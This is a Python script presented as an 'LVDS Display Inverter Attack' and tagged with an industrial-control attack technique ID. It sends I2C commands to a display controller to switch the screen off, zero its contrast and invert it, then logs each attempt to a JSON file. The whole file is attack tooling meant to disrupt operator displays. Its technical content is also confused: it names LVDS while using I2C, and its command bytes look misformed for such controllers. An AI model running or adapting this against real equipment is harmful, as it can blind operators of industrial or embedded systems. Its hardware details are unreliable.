#!/usr/bin/env python3

import smbus, argparse, time, os, json
from datetime import datetime

LOG_FILE = "results/lvds_invert_logs.json"
MITRE_TTP = "T0816"

def log_action(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def invert_display(bus_num=1, addr=0x3C):
    try:
        bus = smbus.SMBus(bus_num)
        bus.write_byte_data(addr, 0x00, 0xAE)  # Example: flip power signal
        bus.write_byte_data(addr, 0x81, 0x00)  # Reduce contrast to zero
        time.sleep(1)
        bus.write_byte_data(addr, 0xA7, 0xFF)  # Invert screen polarity
        return True
    except Exception as e:
        print(f"[!] LVDS attack failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="LVDS Display Inverter Attack")
    parser.add_argument("--bus", type=int, default=1, help="I2C bus number")
    parser.add_argument("--addr", type=lambda x: int(x, 0), default=0x3C, help="I2C address (e.g., 0x3C)")
    args = parser.parse_args()

    result = invert_display(args.bus, args.addr)
    log_action({
        "timestamp": datetime.utcnow().isoformat(),
        "bus": args.bus,
        "address": hex(args.addr),
        "success": result,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
